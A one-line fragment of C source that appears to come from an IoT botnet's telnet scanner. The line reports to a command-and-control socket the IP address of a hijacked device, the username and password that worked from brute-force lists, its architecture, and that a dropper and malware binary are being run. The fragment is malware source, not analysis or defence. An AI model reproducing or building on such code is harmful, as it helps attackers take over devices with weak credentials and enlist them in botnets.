                    	sockprintf(C2Sock, "[tel] [%s:23 %s:%s] [%s] echo complete, executing dropper and binary",inet_ntoa(*(struct in_addr *)&(ktx[i].ip)), usernames[ktx[i].usernind], passwords[ktx[i].pwordind], ktx[i].arch);
